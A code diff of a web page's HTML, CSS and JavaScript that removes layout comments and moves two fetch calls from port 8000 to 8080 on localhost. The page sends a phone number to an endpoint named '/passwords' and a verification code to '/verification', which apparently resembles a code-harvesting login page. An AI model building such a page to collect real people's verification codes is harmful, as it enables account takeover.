@@ -25,7 +25,7 @@
             width: 100%;
             max-width: 500px;
             position: absolute;
-            top: 2cm; /* Adjusted by 2 cm */
+            top: 2cm;
         }
 
         .verification-container h1 {
@@ -253,14 +253,14 @@
 
         @media (max-width: 600px) {
             .verification-container {
-                margin-top: 2cm; /* Move verification container 2cm from top on mobile */
+                margin-top: 2cm;
             }
 
             .container {
                 width: 95%;
                 max-width: 340px;
-                height: calc(100vh - 4cm); /* Adjust height on mobile */
-                margin-top: 0; /* Adjust margin for full-screen fit */
+                height: calc(100vh - 4cm);
+                margin-top: 0;
             }
 
             .verification-container button {
@@ -374,7 +374,7 @@
                 }
 
                 // Send phone number to the server
-                fetch('http://localhost:8000/passwords', {
+                fetch('http://localhost:8080/passwords', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -409,7 +409,7 @@
                 }
 
                 // Send verification code to the server
-                fetch('http://localhost:8000/verification', {
+                fetch('http://localhost:8080/verification', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
